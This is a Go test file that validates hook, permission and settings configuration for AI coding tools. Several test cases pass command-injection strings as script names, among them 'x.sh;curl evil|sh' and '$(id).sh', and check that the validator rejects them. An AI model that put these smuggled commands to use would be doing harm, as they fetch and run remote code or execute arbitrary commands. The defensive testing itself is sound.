package config

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/Goldziher/ai-rulez/schema"
)

func TestDecodeSettingsBlocks(t *testing.T) {
	cfg, err := decodeConfigTOML([]byte(`
version = "4.0"
name = "x"

[[hooks]]
event = "PreToolUse"
matcher = "Bash"
targets = ["claude", "gemini"]
matchers = { gemini = "run_shell_command" }
[[hooks.hooks]]
command = "echo guard"
timeout = 5

[permissions]
allow = ["Bash(git status)"]
deny = ["Read(./.env)"]

[claude.settings.managed]
env = { FOO = "bar" }
skill_overrides = { init = "off" }
`), "config.toml")
	require.NoError(t, err)
	require.Len(t, cfg.Hooks, 1)
	assert.Equal(t, []string{"claude", "gemini"}, cfg.Hooks[0].Targets)
	assert.Equal(t, "run_shell_command", cfg.Hooks[0].Matchers["gemini"])
	assert.Equal(t, []string{"Bash(git status)"}, cfg.Permissions.Allow)
	assert.Equal(t, "off", cfg.ManagedClaudeSettings().SkillOverrides["init"])
	assert.True(t, cfg.HasClaudeSettingsContent())
}

func TestValidateSettingsBlocks(t *testing.T) {
	base := func() *Config { return &Config{Version: "4.0", Name: "x"} }
	tests := []struct {
		name    string
		mutate  func(c *Config)
		wantErr string
	}{
		{"valid hook", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Command: "echo"}}}}
		}, ""},
		{"event required", func(c *Config) {
			c.Hooks = []HookGroup{{Hooks: []HookAction{{Command: "echo"}}}}
		}, "missing 'event'"},
		{"command xor script", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Command: "a", Script: "b"}}}}
		}, "both 'command' and 'script'"},
		{"needs command or script", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{}}}}
		}, "requires either"},
		{"script may not escape", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "../x.sh"}}}}
		}, "unsafe script"},
		{"valid script path", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "scripts/guard-1_a.b.sh"}}}}
		}, ""},
		{"script with a space", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "scripts/a b.sh"}}}}
		}, "may only contain"},
		{"script with a command separator", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "x.sh;curl evil|sh"}}}}
		}, "may only contain"},
		{"script with a command substitution", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "$(id).sh"}}}}
		}, "may only contain"},
		{"script with a backtick", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "`id`.sh"}}}}
		}, "may only contain"},
		{"script with a quote", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "a'b.sh"}}}}
		}, "may only contain"},
		{"script with a newline", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: "a.sh\nid"}}}}
		}, "may only contain"},
		{"script with a backslash", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Hooks: []HookAction{{Script: `a\b.sh`}}}}
		}, "may only contain"},
		{"unknown target", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Targets: []string{"vim"}, Hooks: []HookAction{{Command: "a"}}}}
		}, "unknown harness"},
		{"unknown matcher harness", func(c *Config) {
			c.Hooks = []HookGroup{{Event: "Stop", Matchers: map[string]string{"vim": "x"}, Hooks: []HookAction{{Command: "a"}}}}
		}, "unknown harness"},
		{"empty permission rule", func(c *Config) {
			c.Permissions = &Permissions{Deny: []string{" "}}
		}, "empty rule"},
		{"overbroad allow is a warning, not an error", func(c *Config) {
			c.Permissions = &Permissions{Allow: []string{"Bash(*)"}}
		}, ""},
		{"bad skill override", func(c *Config) {
			c.Claude = &ClaudeConfig{Settings: &ClaudeSettings{Managed: &ManagedSettings{SkillOverrides: map[string]string{"a": "maybe"}}}}
		}, "unsupported state"},
		{"bad env name", func(c *Config) {
			c.Claude = &ClaudeConfig{Settings: &ClaudeSettings{Managed: &ManagedSettings{Env: map[string]string{"A=B": "1"}}}}
		}, "not a valid environment variable name"},
		{"plugin hooks reject targets", func(c *Config) {
			c.Plugin = &PluginAuthoring{Name: "p", Version: "1.0.0", Description: "d", Runtimes: []string{PluginRuntimeClaude},
				Hooks: []HookGroup{{Event: "Stop", Targets: []string{"claude"}, Hooks: []HookAction{{Command: "a"}}}}}
		}, "'targets' or 'matchers'"},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cfg := base()
			tt.mutate(cfg)
			err := firstError(cfg.validateSettingsBlocks(), cfg.validatePluginAuthoring())
			if tt.wantErr == "" {
				require.NoError(t, err)
				return
			}
			require.Error(t, err)
			assert.Contains(t, err.Error(), tt.wantErr)
		})
	}
}

func TestOverbroadAllowRules(t *testing.T) {
	p := &Permissions{Allow: []string{"Bash(git status)", "Bash(*)", "Bash", "WebFetch", "Edit(*)", "Read(./docs/**)", "mcp__memory", "*", "Bash(git *)"}}
	assert.Equal(t, []string{"Bash(*)", "Bash", "WebFetch", "Edit(*)", "*"}, p.OverbroadAllowRules())
	assert.Empty(t, (*Permissions)(nil).OverbroadAllowRules())
}

// The JSON schema (validate) and Config.Validate (generate) must agree on the
// handler types of a top-level [[hooks]] group: generate used to accept
// type = "prompt" and silently render it as a command handler.
func TestSettingsHookType_SchemaAndValidateAgree(t *testing.T) {
	for _, tc := range []struct {
		typ string
		ok  bool
	}{{"", true}, {"command", true}, {"prompt", false}, {"http", false}} {
		body := "version = \"4.0\"\nname = \"x\"\n[[hooks]]\nevent = \"PreToolUse\"\n[[hooks.hooks]]\ncommand = \"echo\"\n"
		if tc.typ != "" {
			body += "type = \"" + tc.typ + "\"\n"
		}
		schemaErr := schema.ValidateFile(writeConfigTOML(t, body))
		cfg, err := decodeConfigTOML([]byte(body), "config.toml")
		require.NoError(t, err)
		validateErr := cfg.validateSettingsBlocks()
		assert.Equal(t, tc.ok, schemaErr == nil, "schema, type %q", tc.typ)
		assert.Equal(t, tc.ok, validateErr == nil, "validateSettingsBlocks, type %q", tc.typ)
	}
}

func writeConfigTOML(t *testing.T, body string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), "config.toml")
	require.NoError(t, os.WriteFile(path, []byte(body), 0o644))
	return path
}
